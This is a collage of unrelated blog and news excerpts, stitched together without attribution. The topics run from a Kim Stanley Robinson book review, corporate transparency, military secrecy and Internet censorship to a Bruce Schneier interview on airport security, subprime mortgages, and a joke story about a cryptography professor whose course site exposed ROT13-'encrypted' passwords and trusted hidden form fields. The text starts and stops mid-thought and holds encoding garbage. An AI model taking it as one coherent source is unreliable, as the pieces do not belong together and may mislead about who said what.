The biological mitigation schemes discussed in my novel , and unleashed in one case , are definitely not at all ready for deployment , and maybe never will be , for reasons I think my book makes clear .
The main thing we could do now is vastly increase our construction of clean - energy generation .
Well , this is certainly a change of pace for the fans of Kim Stanley Robinson 's epic " Mars " trilogy .
That series , of course , was an intricate meshing of hard science , ecological musings , adventure , and sociological speculations .
In its scope and in the wealth of issues with which it dealt , it was not unlike Frank Herbert 's classic " Dune " trilogy .
" Escape from Kathmandu " is something far different .
For one thing , it is set in the Nepal of our own timeframe ( or close thereto ... the four stories were originally written in the mid-'80s ) .
For another , the protagonists are not colonizers or scientists or eco-rebels ... they 're hash - smoking Western expatriates who hang about the Himalayas in a rather carefree fashion , living for the thrill of climbing .
Happily enough , for those with eyes to see , the area is rife with yetis , hidden cities and tunnels , and reincarnated lamas .
So adventure is never too far away .
The plots themselves are rather slight and uncompelling , and they creak somewhat under the weight of the political views heaped upon them .
Tibet and the Dalai Lama = good , China = bad ( the Chinese are portrayed as genocidal militant oppressors and poachers to boot , although in the current political climes , many would tend to agree with this assessment ) .
The ruling elite of Nepal are villains .
Governments are almost uniformly bad , but luckily they will someday be overthrown by enlightened spiritual types .
Nevertheless , the book does offer some insight into the impoverished country of Nepal , although an earlier reviewer notes that most of the information is wrong or misleading , so do n't take any of the descriptions of conditions as gospel truth .
It 's especially weird to read this book now , given the very recent upheavals in the country in June and July of this year ( the crown prince 's killing spree and the resignation of the prime minister ) .
Since some of the members of the royal family actually appear as characters in the stories , it 's rather unsettling to find out their real - life fates lately .
Speed , notes journalist and author Carl Honore , has become a combining form : speed dialing , speed reading , speed walking , even speed dating .
Modern life is stuck on fast - forward to such an extent , he notes , quoting Postcards from the Edge , that " even instant gratification takes too long . "
But there 's a backlash brewing , he says , as everyday people start putting the brakes on .
He concludes with the results of his own attempt to get in touch with his " inner tortoise . "
If it seems sometimes that the pace of life has quickened , rest assured that it has -- by about 10 per cent over the last decade .
We can thank Richard Wiseman , a professor of psychology at the University of Hertfordshire in England , for quantifying the unquantifiable .
He did it by comparing the time it took pedestrians in cities around the world to walk 60 feet ( 18.3 metres ) in a 1994 study with recorded times of city dwellers traversing the identical length of unobstructed pavement today .
The results show that on average we move at about 3.5 mph ( 5.6 km per hour ) , or 10 per cent faster than in the early 1990s , an increase Wiseman attributed to a frenetic lifestyle driven by technology and 24 - hour availability .
" The psychology is basically that people 's walking pace is determined by how much they think they 're in a hurry ; how quickly they think they should be doing things , " he said .
" What 's amazing is that these days , you press send on an e-mail and , if someone has n't responded in 10 minutes , you think : ' Where are they ? ' "
Not surprisingly , the pace in the so - called Asian Tigers has quickened the most , with pedestrians in Singapore walking 30 per cent faster than a decade ago , covering the distance in a mere 10.4 seconds ; and in Guangzhou ( China ) 20 per cent faster , in 10.94 seconds .
I am an advocate of localization , simplification , self - sufficiency and fulfilled ontogeny .
Slow food .
Tribalism .
A thousand other catch - phrases that , above all else , raise a singular objection from friends and critics alike : is n't your idealized vision starkly juxtaposed to your professed enjoyment of the finer things in life ?
My response : on the contrary , my good friend ... these worlds are in fact one in the same , only separated by the disinformation of the consumer economy .
I have spent , to be perfectly honest , more than my fair share of mornings slowly enjoying an espresso as the fog burns off the slopes of Mount Etna in the distance , the scent of blood orange blossoms mingling with the sharp aroma of coffee .
This is the kind of perfect moment that embodies our cultural ethos : sacrifice enough of what you love now , and you 'll make enough money that some day you 'll be able to buy back those priceless experiences in the form of a luxury cruise , a meal at that new bistro or a beach house in Florida .
The irony is that this perfect moment cost about 65 cents -- that 's less than 8 minutes wage for a cashier at McDonald's , and yet it 's enough to make highly paid executives and professionals alike salivate .
This should tell us something ...
The finer things in life can generally be divided into two categories : material and experiential .
Despite the relentless psychological barrage of advertising , most of us can readily admit that it is the experiential that is truly rewarding and fulfilling .
Many even recognize their own predilection to fulfill their desire for the experiential by compensating with an excess of the material .
Commercialism tells us that the experiential -- that which requires time -- is too costly , out of our reach .
Our time , we are led to believe , must be sacrificed to meet the demands of the economy .
But time is free for all of us .
It is the great equalizer , something to which we all have equally random access .
But in the modern economy , where average individuals cannot directly provide for themselves , they are duped into trading time for the basic necessities of life -- necessities that are directly available to the poorest of the Earth .
As this economic hierarchy has intensified over time , we continue to be duped into trading our time for material possessions -- far beyond those required to survive .
The memes of our economic culture have convinced us that the material is a fine substitute for the experiential .
A nagging doubt , dissatisfaction with our own suburbanization , some unknown , unfulfilled yearning tells us that , despire the overtures of mass - media , even the materially rich among us still long for the experiential .
The sun on your face , playing with your children , staring at a fire until late into the night , sitting still in the forest listening to the wind rush through aspen leaves , talking with friends , laying on your back in a meadow and watching the clouds pass above you .
All of these things are free -- they require only time .
Hunter - gatherers around the world spend , on average , less than 20 hours a week " working " .
The rest of their time was available for the experiential , the " finer things " in life .
Perhaps this is why anthropologist Marshal Sahlins calls them " The Original Affluent Society " , or why Paul Shepard says that humanity 's time in the " hamlet economy " was the best it ever had .
The finer things in life are nothing more than a connection and a oneness with those things that modern culture insists remain separate or " sacred " .
This connection is available to all of us .
Reconnecting to the finer things in life is not dependent on success within the modern commercial economy ... on the contrary , my good friend , this reconnection requires that we take a new - - or is it old ? -- approach to life .
This is vernacular zen .
An interesting new article in Wired Magazine suggests that transparency is the new king and secrecy is dying .
I agree that there are too many secrets , and wrote about the potential for " radical transparency " in everything from military operations to business back in 2004 .
The problem , as usual , is power , and the Wired article highlights this issue by ignoring it : transparency is good and secrecy is dying as long as it's profitable , and not before .
There is a high cost to early adopters of radical transparency , and the failure to view this game as an infinitely iterated game will most likely prevent any adoption of radical transparency in most cases .
I 'll go out on a limb and suggest that radical transparency ALWAYS makes sense IF you 're the good guy .
The quanum leap in radical transparency will not come until the public at large realize the corrollary to that rule : if you 're not radically transparent , you 're the bad guy .
This is so obvious as to be almost invisible .
Tony Snow : " ... it's a reasonable and extraordinary effort on our part to help Congress do its job [ by insisting that officials testify without a record and not under oath ] "
The Internet has inverted the social physics of information .
Companies used to assume that details about their internal workings were valuable precisely because they were secret .
If you were cagey about your plans , you had the upper hand ; if you kept your next big idea to yourself , people could n't steal it .
Now , billion - dollar ideas come to CEOs who give them away ; corporations that publicize their failings grow stronger .
Power comes not from your Rolodex but from how many bloggers link to you - and everyone trembles before search engine rankings .

" You ca n't hide anything anymore , " Don Tapscott says .
Coauthor of The Naked Corporation , a book about corporate transparency , and Wikinomics , Tapscott is explaining a core truth of the see - through age :
If you engage in corporate flimflam , people will find out .
He ticks off example after example of corporations that have recently been humiliated after being caught trying to conceal stupid blunders .
There 's Sony , which put a rootkit - a piece of spyware - on music CDs as a secret copy - protection technique , only to wind up in court when bloggers revealed that the code left their computers vulnerable to hacker intrusions .
There 's Microsoft , this time on the wrong side of the transparent shower curtain , offering to pay people to buff up the company 's Wikipedia entry .
And Diebold , which insisted its voting machines were unhackable - until a professor posted a video of himself rigging a mock election on them .
The video went viral and racked up some 300,000 YouTube views .
Secrecy is dying .
It 's probably already dead .

In a world where Eli Lilly 's internal drug - development memos , Paris Hilton 's phonecam images , Enron 's emails , and even the governor of California 's private conversations can be instantly forwarded across the planet , trying to hide something illicit - trying to hide anything , really - is an unwise gamble .
So many blogs rely on scoops to drive their traffic that muckraking has become a sort of mass global hobby .
Radical transparency has even reached the ultrasecretive world of Washington politics :
The nonprofit Sunlight Foundation has begun putting zillions of public documents in elegantly searchable online databases , leaving it to interested citizens to connect the dots .
One adroit digger recently discovered that former House Speaker Dennis Hastert had earmarked $ 200 million for a highway to be built near a property he had a stake in .
When the property was sold , Hastert made a 500 percent profit on his original investment , provoking a wave of negative coverage .
All of which explains why the cult of transparency has so many high tech converts these days .
Transparency is a judo move .
Your customers are going to poke around in your business anyway , and your workers are going to blab about internal info - so why not make it work for you by turning everyone into a partner in the process and inviting them to do so ?
We , the undersigned , believe that broad dissemination of research results is fundamental to the advancement of knowledge .
For America 's taxpayers to obtain an optimal return on their investment in science , publicly funded research must be shared as broadly as possible .
Yet too often , research results are not available to researchers , scientists , or the members of the public .
Today , the Internet and digital technologies give us a powerful means of addressing this problem by removing access barriers and enabling new , expanded , and accelerated uses of research findings .
We believe the US Government can and must act to ensure that all potential users have free and timely access on the Internet to peer - reviewed federal research findings .
This will not only benefit the higher education community , but will ultimately magnify the public benefits of research and education by promoting progress , enhancing economic growth , and improving the public welfare .
We support the re-introduction and passage of the Federal Research Public Access Act , which calls for open public access to federally funded research findings within six months of publication in a peer - reviewed journal .

But instead of going to court , the group downloaded all 6,288 photos online and posted them Wednesday night on the free Internet site .

While I 'm awaiting publication of an article that I wrote on the escalating violence in Nigeria , I 'll vent for a moment about an intelligence - related problem that I 've continually run up against - as recently as yesterday .
The problem is collecting intelligence on our own forces - " Blue Force Intel . "
It 's a symptom of the deeper sickness of secrecy within our military .
Open source warfare - the kind of thing increasingly practiced by outfits like al - Qa'ida - has far less of an issue with this .
But the United States tends to guard information according to the classic method : the security of a secret is inversely proportionate to the square of the number of people who know it .
Put otherwise , the US government does n't tell the US government what it is doing , and especially not what it is planning to do .
My most memorable experience with this occurred during the invasion of Iraq in 2003 .
As chief of intelligence for a squadron of electronic jamming aircraft ( EC - 130H Compass Call ) , I planned offensive and defensive components of our missions .
Offensive components included jamming enemy communications infrastructure in the locations that most aided our advancing ground forces .
This , naturally , required high - resolution understanding of what our ground forces were presently doing , and would be doing in the next day or two .
Defensive components included avoiding those areas where our aircraft would be most vulnerable to surface - to - air fire .
This , naturally , required high - resolution understanding of what our ground forces were presently doing ( what areas they had cleared , what areas they had simply bypassed ) , and what they would be doing in the next day or two .
Naturally , it was virtually impossible to get any of this information direct from the horse 's mouth .
Sure , at some central operations center ( actually only a few miles from my tent , but on an entirely different base that required driving a half hour through downtown Doha ) there were people representing the exact units that I needed information on , but they did n't know what precisely their own units were doing any more than our own representatives knew what we were planning - it was a simple issue of information processing burden I hierarchy .
We had enough time to plan our own missions , or communicate all the fine details of those missions to our representatives , but not both .
So , it turned out that the most effective way to get the information that we needed was to engage in our own , unsanctioned intelligence collection on our own forces .
This may seem wasteful , but it involved significantly less information processing burden in a hierarchy the size of the US military than actually asking our army units where they are now and where they plan to be tomorrow .
Plus , they would n't tell us anyway .
Sure , we were on the same side , but specific operational details of the kind we needed are on a " need to know basis , " and no matter how much we explained that we need to know to protect * you* , we still did n't have the right kind of " need to know . "
So we would debrief our own flight crews on their observations about our own units locations , we would deduce our own military plans from information that we could access about locations for our own satellite collections , UAV flight paths , etc. , and we would scour the secure internet looking for ways to access other units mission planning files .
It worked out OK .
Which reminds me about my favorite part of the TV show " 24 " : the utter fantasy of how easily and fluidly they access information and electronic systems that magically tell them what they need to know .
Trust me , it does n't work like that .
Fast forward to the present .
I 'm still dealing with the same issues when I work with domestic infrastructure security matters .
Consider the following scenario : assume for the moment that there is a possibility that we will attack Iran .
Then assume that , after we attack Iran , Iran will retaliate by attacking inside the US .
Now assume that you 're tasked with protecting against that retaliatory attack .
Would n't it be nice to know if , and when , we are going to attack Iran .
Hah !
It appears that I do n't have the need to know these things .
So , I resort to the same old tricks , and go to work using our own intelligence infrastructure to collect intelligence on ourselves .
Another example of the idiocy of hierarchy .
A young clerk with no knowledge of the 1989 Tiananmen Square crackdown allowed a tribute to victims slip into the classified ads page of a newspaper in southwest China , a Hong Kong daily reported on Wednesday .
The tiny ad in the lower right corner of page 14 of the Chengdu Evening News on Monday night , read : " Paying tribute to the strong ( - willed ) mothers of June 4 victims " .
An investigation was launched by Chinese authorities to find out how the advertisement slipped its way past censors .
Public discussion of the massacre is still taboo in Beijing and the government has rejected calls to overturn the verdict that the student - led demonstrations were " counter - revolutionary " , or subversive .
Hundreds , perhaps thousands , were killed when the army crushed the pro-democracy protests on June 4 , 1989 .
Hong Kong 's South China Morning
Post said a young woman on the Chengdu Evening News classified section had allowed the ad to be published because she 'd never heard of the June 4 crackdown .
I 've long been a proponent of the core Viridian argument that " making the invisible visible " ( MTIV ) -- illuminating the processes and systems that are normally too subtle , complex or elusive to apprehend -- is a fundamental tool for enabling behavioral change .
When you can see the results of your actions , you 're better able to change your actions to achieve the results you 'd prefer .
I 've come to understand , however , that it 's not enough to make the invisible visible ; you also have to make it meaningful .
The canonical example of how MTIV works is the mileage readout standard in hybrid cars .
Almost invariably , hybrid owners see a gradual but noticeable improvement in miles - per - gallon over the first month or so of hybrid vehicle ownership .
This is n't so much the car being " broken in , " but the driver : because of the mileage readout , the hybrid driver can see what driving patterns achieve the best results .
A growing number of non -hybrid cars now include miles - per - gallon readouts ; will we see similar improvements in driver behavior as a result ?
Possibly , but not likely .
The hybrid miles - per - gallon readout comes in two forms : an average mileage , whether calculated for the current tank or the total vehicle miles ; and a real - time , current mileage display , which will fluctuate significantly while one drives .
As far as I have found , the non-hybrids with mileage readouts only include the average mileage display , not the real - time display .
( Update : Howard notes in the comments a few makes of non -hybrid cars that do have both the average and real - time displays .
I would be very interested in an examination of driver behavior -- and possible changes in behavior -- for those cars . )
This is useful information , to be sure ; it 's good to know what kind of mileage a vehicle gets in real - world use .
But as a means of MTIV , it 's not terribly helpful , because it breaks the connection between the action and the result .
After the first few dozen miles of a given tank of gas , the average mileage readout changes very slowly , and only with sustained greater - than - average or less - than - average mileage driving .
Small variations get lost in the noise .
This means that minor changes in driving behavior can't be mapped to minor changes in miles - per - gallon .
Without that connection between " I did this " and " I got that , " drivers can't as easily learn to drive in a more efficient way .
The driver needs to be able to compare behaviors and results to learn what works best .
Both forms of display are necessary .
The average mileage is the context for the momentary changes , and it's the comparison between the two that provides meaning .
This dilemma is n't just an issue for cars .
Late last month , the UK's environment secretary , David Milbrand , proposed putting ecological impact labels on all food products sold in UK stores .
These labels would focus on the amount of carbon emitted as the result of the production of the food item .
In this , the UK government is playing catch - up with some of its businesses , as the grocery chain Tesco announced in late January that it would be adding carbon labels to the products it sold .
And now the Carbon Trust , a UK non-profit that works with businesses to reduce their greenhouse impacts , has embarked on an effort to build a labeling standard for adoption across industries .
( It should come as no surprise that I 'm very much in favor of this sort of labeling ! ) ...
A report released today by the OpenNet Initiative ( ONI ) concludes that the scale , the scope , and the sophistication of state - based Internet filtering have all increased dramatically in recent years .
The survey highlights the tools and techniques used by countries to keep their citizens from viewing certain kinds of online material .
ONI is a collaboration among four leading universities : Cambridge , Oxford , Harvard , and Toronto .
The group 's testing was carried out during 2006 and early 2007 .
ONI used a combination of tools that can remotely test filtering conditions within given countries .
The group also relied heavily on local researchers who evaluated Internet conditions from inside certain countries .
Some countries , such as Cuba and North Korea , were deemed too dangerous for either remote or in - country testing .
But of the 41 different countries tested by ONI , 25 were found to block or filter online content .
" Over the course of five years , we 've gone from just a few places doing state - based technical filtering , like China , Iran , and Saudi Arabia , to more than two dozen , " says John Palfrey , executive director of the Berkman Center for Internet and Society at Harvard Law School .
" As Internet censorship and surveillance grow , there 's reason to worry about the implications of these trends for human rights , political activism , and economic development around the world . " ...
One interesting case is that of heavily wired South Korea , where ONI found Internet filtering limited to one topic : North Korea .
" The South Koreans block several North Korean websites , " says Nart Villeneuve , director of technical research at the Citizen Lab at the University of Toronto .
" They even tamper with the system so that when you try to access one of those North Korean sites , the URL resolves to a South Korean police page telling you , ' What you 're trying to access is illegal , and we know your IP [ Internet protocol ] address . ' "
( An IP address could be used to locate the computer where the search is conducted , with the ultimate goal of identifying the individual involved . )
The head of a US intelligence agency told the Associated Press that commercial satellite services like Google Earth may need to be censored in the future in order to protect American interests .
Vice Admiral Robert Murrett , who heads the National Geospatial - Intelligence Agency , spends his days helping the government map the planet and studying imagery .
Once the exclusive domain of the government , commercial satellite imagery has attained high - enough resolutions that the government is thinking about ways to restrict its use in times of war or other emergency situations .
" If there was a situation where any imagery products were being used by adversaries to kill Americans , I think we should act , " he said in the interview .
" I think we may need to have some control over things that are disseminated .
I do n't know if that means buying up all the imagery or not .
I think there are probably some other ways you can do it . "
The reference to " buying up all the imagery " refers to the government 's practice of purchasing all commercially - available satellite data on Afghanistan during the early days of the conflict there .
While buying up all available images may be one solution to the problem , the government may also be able to exert a different kind of pressure , as it provides nearly $ 1 billion in grants to major US imagery firms .
As the imagery market becomes international , though , the competing demands of local governments may be more difficult to sort out .
The issue is already becoming tricky for companies like Google that offer popular products using satellite imagery .
Google has already faced requests from Vice President Cheney to remove images of his residence and from the Indian government to blur sensitive military sites .
Headlines in the UK have already claimed that Iraqi insurgents are using Google Earth to attack British troops .
More than 60 years on , the case of Helen Duncan , the last woman in Britain to be jailed for witchcraft , refuses to die .
As her supporters seek a posthumous pardon , evidence has emerged that she may have been the victim of a plot involving British intelligence agents , including Ian Fleming , creator of James Bond .
In the 1940s Duncan , a Dundee housewife and mother of six , travelled the country performing seances for a war - weary public often seeking reassurance about their loved ones .
As a ' materialisation medium ' , which involved her going into a trance and producing ' ectoplasm ' through which spirits would take on earthly features to communicate with the living , Duncan built a reputation as one of spiritualism 's greatest heroines .
However , during a sitting in Portsmouth on 19 January , 1944 , Duncan , 47 , fell foul of the security services when a sailor from HMS Barham is alleged to have formed in ectoplasm and greeted his surprised mother sitting in the audience .
His death had been kept a secret by the Admiralty , which had been trying to conceal news of the ship 's sinking three months earlier .
Fears that Duncan had access to secret information alerted the security services , and an investigation led to her trial at the Old Bailey , accused of contravening the Witchcraft Act of 1735 by pretending to ' bring about the appearances of the spirits of deceased persons ' .
She was jailed for nine months .
At a time when the military authorities were anxious to keep plans of the Allied invasion of occupied France secret , Duncan and other psychics were seen as a potential threat to security .
Drawing on new research and trial documents released to the National Archive , an academic and award - winning film - maker , Robert Hartley , has claimed that the evidence points to a state conspiracy to crack down on security leaks ahead of D - Day by making an example of Duncan .
' In the run-up to D - Day , the authorities were paranoid about potential security leaks and Duncan was in danger of disclosing military secrets during her seances , ' said Hartley .
' Helen Duncan was giving out very accurate information .
There were other mediums round the country giving out news on soldiers that had died and someone in authority took it seriously , whatever the source of the information .
D - Day was coming up and it was absolutely essential to keep the Allied deception plans intact . '
After examining all the documents , Hartley believes there is evidence to suggest that Duncan 's conviction by an Old Bailey jury in March 1944 was unsafe .
In a new book , Helen Duncan : The Mystery Show Trial , he suggests that among those responsible for the conspiracy to convict Duncan was Fleming , a key figure in the naval intelligence services , and John Maude , the prosecuting counsel at the trial .
' I am convinced naval intelligence were working with MI5 , and when I began looking at that connection Ian Fleming 's name kept cropping up as being involved with people either involved in the case or on the sidelines , ' said Hartley .
Ah , patents .
The topic has pretty much taken charge of my life since last week 's column revealing the lack of any way to identify the top 10 living U.S. patent holders Apparently half the Earth 's population has something to say about patents , and most of them are e-mailing me .
My inbox has been blowing up like Anna Nicole Smith between diets
But the deluge has its upsides .
The column prompted a few patent database companies to take a whack at the question .
Two - ipIQ of Chicago and 1790 Analytics of New Jersey - came up with answers .
So here , for the first time , is a list of the 10 most - prolific inventors .
This is from ipIQ :
1. Shunpei Yamazaki , Japan , 1,432 patents .
Yes , it seems to be true :
The top individual holder of U.S. patents is based at Tokyo tech research firm Semiconductor Energy Laboratory .
For decades , the popular assumption has been that Thomas Edison is the all - time patent king with 1,093 patents .
Yamazaki blows away Edison , and he is still inventing and getting patents .
...
And then there 's one other oddity , pointed out by reader Michael Ravnitzky .
This would be the Invention Secrecy Act of 1951 .
It 's possible that any patent list results are skewed because various government agencies have the ability to classify any patent as secret and make it invisible to the public .
The USPTO even keeps a chart of " invention secrecy activity . "
It shows that so far in 2005 , there have been 106 " new secrecy orders imposed . "
There are 4,915 " total secrecy orders in effect . " .
So if among all those florist patents Weder and Straeter invented the quantum computing secret decoder ring , we 'd never know about it .
According to the sleeve of his latest book , Beyond Fear : Thinking Sensibly About Security , 'in an Uncertain World , Bruce Schneier is the go - to security expert for business leaders and policy makers . '
If only the policy makers would listen , we'd be safer , happier and still free .
Other books include Applied Cryptography , described by Wired as ' the book the NSA wanted never to be published . '
Beyond Fear deals with security issues ranging from personal safety to national security and terrorism .
Schneier is also a frequent contributor to Wired magazine , The Minneapolis Star - Tribune , and many other fine periodicals .
He also writes a monthly newsletter , Cryptogram .
RU : I want to get right into the political area of security against terrorism .
You wrote that security works better if it 's centrally coordinated but implemented in a distributed manner .
Tell us a little bit about that and maybe say a bit about how that might work .
BS : In security - especially something as broad as national security - it 's important that there be a lot of central coordination .
You can't have people in one area doing one thing , and people in another area doing another thing , and then not have them talking to each other .
So sharing information across jurisdictions and up and down the line of command is important .
When things happen , you need a lot of coordination and you can see coordination failures again and again .
In the aftermath of 9/11 , Hurricane Katrina there was a lot of replication of effort .
A lot of things that were obvious ‚Äö √Ñ¬∂ everyone thought someone else was doing .
But the other half of that is distributed implementation .
You can't be so rigid that your people in the field can't make decisions .
In security today , we see smart people being replaced by rules .
A great example is the Transportation Security Administration .
They will blindly follow the stupidest rule rather than using common sense .
Security works much better when the individuals at the point of security - the guards , the policemen , the customs agents - are well - trained and have the ability to follow their instincts .
Think about how September 11 could have been prevented .
A field agent in Minnesota was really first to put her finger on the plot , but she could n't get her voice heard .
And she did n't have the power to do anything herself .
When you look at the real successes against terrorism at the borders , it 's not custom agents following rules , but noticing something suspicious , and then following their instincts .
So security works best when it 's centrally coordinated , but distributedly implemented .
A great example is the Marine Corps .
That 's their model .
There 's a lot of coordination , but individual marines in the field have a lot of autonomy .
They 're trained well , and they 're trusted .
And because of that , it 's a good fighting force .
RU : You 're talking about de-centralization , basically - the organizations making decisions on the local level .
BS : Right .
Another analogy is the human body .
There 's a lot of coordination , but it 's a very distributed organism .
The pieces of our body do things autonomously , without waiting for approval .
There 's a lot of communication back and forth , a lot of coordination , but different pieces have their job , and they 're empowered to do it .
And it 's robust and reliable because of that .
RU : What about radically democratized security , like Open Source kinds of efforts involving citizens ?
BS : It 's good and bad depending on how it works .
I like Open Source intelligence .
I like Open Source information gathering and dissemination .
There 's a lot of value in that .
The downside of that is something like Total Information Awareness - TIA - where you have citizens basically spying on each other .
And there you get pretty much nothing but false alarms .
People will turn each other in because their food smells funny or they do n't pray at the right time .
Done right , a radically democratized , distributed security model works .
Done wrong , you get East Germany where everyone spies on their friends .
RU : They were trying to get the postmen to spy on us for a while .
BS : Right .
They were going to have postmen and the meter readers .
That will work well if the postmen are properly trained .
Where that will fail : if you tell a bunch of postmen , ' Report anything suspicious . '
Because honestly , they do n't know what ' suspicious ' looks like in this context .
So the question is : given all the police resources we have , what should they be doing ?
I do n't want the government chasing all the false alarms from the postmen and meter readers when they could be doing something more useful .
So that 's a bad use .
If you train them properly , you 'll have something better .
But then you do n't have a postman any more .
You have a security officer .
Think of a customs agent .
They 're going to watch people , and they 're going to look for something suspicious .
But they 're trained in how to do it .
So they 're less likely to be overtly racist or a fool for dumb profiles .
They 're more likely to look for things that are actually suspicious .
So it 's a matter of training .
And that 's pretty much true of Open Source security models .
Think of Open Source software .
Having a bunch of random people look at the code to tell you if it 's secure wo n't work .
If you have well - trained people who look at the code , that will work !
Open Source just means you can see it , it does n't guarantee that the right people will see it .
RU : Even with trained security people , it seems like they make an awful lot of errors .
It seems like America , over the past few years , really has that ' Ca n't Do ' spirit .
Is there anything you can tell us about trained security people , and how they could improve their efforts .
BS : Well , they 're always going to make errors .
Fundamentally , that 's a problem in the mathematics called the base rate fallacy .
There are simply so few terrorists out there that even a highly accurate test , whether automatic or human - based , will almost always bring false alarms .
That 's just the way the math works .
The trick is to minimize the false alarms .
You 've got to look at the false alarms versus the real alarms versus the real attacks missed - look at all the numbers together .
But terrorist attacks are rare .
They almost never happen .
No matter how good you are , if you stop someone in airport security , it 's going to be a false alarm , overwhelmingly .
Once every few years , it 'll be a real planned attack ‚Äö √Ñ¬∂ maybe not even that frequently .
With training , you 're less likely to stop someone based on a dumb reason .
When airport security stops a grandma with a pocketknife , that 's a false alarm .
That 's not a success .
That 's a failure .
It 's , of course , ridiculous .
So the trick is to alarm on things that are actually suspicious so you 'd spend your time wisely .
But the fact that almost everybody will still end up being a false alarm - that 's just the nature of the problem .
RU : Most of us experience the so - called ' War on Terror ' in one place , and that 's at the airport .
What are they doing right , and what are they doing wrong at the airports ?
Are they doing anything right ?
BS : ( Laughs ) Since September 11 , exactly two things have made us safer .
The first one is reinforcing the cockpit door .
That should have been done decades ago .
The second one is that passengers are convinced they have to fight back , which happened automatically .
You can argue that sky marshals are also effective .
I 'm not convinced .
And actually , if you pretend you have sky marshals , you do n't even actually have to have them .
The benefit of sky marshals is in the belief in them , not in the execution .
Everything else is window dressing - security theater .
It 's all been a waste of money and time .
Heightened airport security at the passenger point of screening has been a waste of time .
It 's caught exactly nobody ; it 's just inconvenienced lots of people .
The No Fly List has been a complete waste of time .
It 's caught exactly nobody .
The color - coded threat alerts - I see no value there .
...
RU : So if you were in charge of airport security , are there any things that you would implement ?
BS : I think we should ratchet passenger screening down to pre-9/11 levels .
I like seeing positive bag matching .
That 's something that was done in Europe for decades .
The U.S. airlines screamed and screamed and refused to do it , and now they are .
Really , I would take all the extra money for airport security and have well - trained guards , both uniformed and plainclothes , walking through the airports looking for suspicious people .
That 's what I would do .
And I would just give back the rest of the money .
If we secure our airport and the terrorists go bomb shopping malls , we 've wasted our money .
I dislike security measures that require us to guess the plot correctly because if you guess wrong , it 's a waste of money .
And it 's not even a fair game .
It 's not like we pick our security , they pick their plot , we see who wins .
The game is we pick our security , they look at our security , and then they pick their plot .
The way to spend money on security - airport security , and security in general - is intelligence investigation and emergency response .
These are the things that will be effective regardless of what the terrorists are planning .
RU : You emphasize intelligence .
Is there any truth to the claims made by various agencies that intelligence people could n't do things that they should have been able to do to protect us because of the Church Committee rules in the mid-1970s ?
BS : I think that 's overstated .
The controls that the Church Committee put in place made a lot of sense .
The purpose was to stop very serious abuses by law enforcement - by the police , the NSA , and the CIA .
If you look at the failures of 9/11 , they were n't based on the Church Commission restrictions .
So I think we 're making a mistake by dismantling those protections .
In effect , those are also security measures that protect us from government abuses .
Unfortunately , those abuses are far more common than terrorist attacks .
...
RU : I guess the idea of Total Information Awareness would seem sexy to some portion of the geek population .
That 's where it came from !
BS : We 're so desperate to find ways to harness technology to solve the problem .
We 're used to that working in other areas of society - just apply more computing power , you get better results .
This is fundamentally a human problem .
It 's not a data problem .
It 's a problem of human intelligence connecting the dots .
If I 'm looking for a needle in a haystack , throwing more hay on the pile is n't going to solve my problem .
I need a better way to methodically follow the lead into the haystack to the needle .
Another lesson of the liquid plot is that if they got to the airport , it would 've gotten through .
It would 've gotten through all the enhanced screening ; it would 've gotten through all the enhanced profiling .
The reason it failed had nothing to do with airport security .
RU : Moving on from terrorism , but still thinking about haystacks - you have a bit in ' Beyond Fear ' about learning about security from insects , which I found really fascinating .
What can we learn from insects ?
BS : There 's a lot to be learned from security from the natural world in general .
All species have evolved as security beings - we need to survive enough to reproduce .
We need to be able to protect our offspring so they can survive .
We need to protect our food supply .
We attack other creatures to kill them and eat them .
There 's so much security interplay in the natural world .
And it 's a great source of strategies and anecdotes .
I find insects particularly valuable , because they evolve so quickly .
You see so many interesting strategies in the insect world , because of the wacky evolutionary turns they take .
Evolution does n't give you the optimal security measure .
Evolution tries security measures at random , and stops at the first one that just barely works .
So you tend to get really weird security in the insect world .
You do get some real neat examples of distributed security measures .
Think of the way ants protect their colony .
There are ant species that just wander around randomly , and if they hit a predator or a threat , they run right back to their colony to alert everybody .
Individual ants are very cheap and very expendable , so if you have cheap resources , you just sort of do random things .
The lima bean plant is interesting .
Effectively , when a certain mite attacks it , it calls an air strike .

Perhaps the American dream of homeownership is not for everyone .
That may sound at odds with a bedrock notion of society promoted by presidents for decades .
But many experts say it is a message that can be drawn from the rising troubles with mortgages provided to home buyers with weak credit .
Several large mortgage companies have stopped making new loans , and others have tightened lending standards .
Hundreds of thousands of families who bought houses in the last two years — using loans with low teaser interest rates and no down payments — are now losing them .
Their short tenure as homeowners calls into question whether the nation ’s long drive to increase homeownership — pushed by both public policy and financial innovations — has overstepped some boundary of demographic and economic sense .
Dan Bugglin needed to find a course to fill three hours of general elective study .
As fun as Masterpieces of Inner City Scandinavian Drama sounded , he thought he'd be better off with something a bit more closely related to his major , and signed up for Applications of Security and Cryptography .
The course sounded like it'd be pretty fun .
Dan and his fellow students would learn the different models of security for real - time , business , and other applications , and also about the different types of cryptography and encryption for sensitive data .
The professor even built a course website with a message board to help students collaborate on various projects .
Unfortunately , Dan realized far too late that the instructor was actually a visiting professor from WTFU .
When Dan went to create a student account on the professor 's message board system , it crashed with a rather strange error :
error writing to datafile " data/passwords.txt " :
separator count mismatch
On a hunch , Dan entered in " data/passwords.txt " at the end of the message board 's web address and was presented with a caret - delimited file of student id's , access levels , names , and passwords .
Dan tried again , this time without using the " ^ " symbol in his password .
He now had an account .
He thought he'd take a look at the passwords file again to see if his name was added .
It was , though his password was different than what he had entered in : it was encrypted !
Well , that 's not too bad -- just because one has the encrypted value , does n't mean he can crack it .
Dan stared at the passwords for a few seconds and thought the scheme looked awfully familiar .
It was n't DES ... or SHA ... or MD5 ... or RSA ... it was ... ROT13 ?
He took a moment to appreciate the irony of a cryptography professor using a substitution cipher for a cryptography class and explored the security / cryptography website a bit further .
Dan noticed that the professor did n't use cookies or session tokens to handle whether the user was " logged in " or not .
Rather , he used an html form with hidden input fields and lots of submit buttons :
< form method = " post " > < input type = " hidden " name =" username " value = " dbugglin " > < input type = " hidden " name = " access " value = " student " > ... snip ... </ form >
As expected , with a bit of Javascript , Dan changed the " username " field and could now see his classmate 's student data .
That was the last straw ; it was time to drop the course .
Dan went back to see if Masterpieces of Inner City Scandinavian Drama was still open .
But then , all of a sudden , Dan changed his mind again .
It all made perfect sense .
Think about it .
It was the perfect Final Assignment .
Find holes in the course website .
Could there be a better treat for security - minded students ?
Dan was once again excited to be in the class .
Unfortunately , the Final Assignment never came .
It turns out that the website was actually a practical application of the visiting professor 's knowledge of the subject .
And that is how Dan came to regret not taking Masterpieces of Inner City Scandinavian Drama .
ATLANTA --
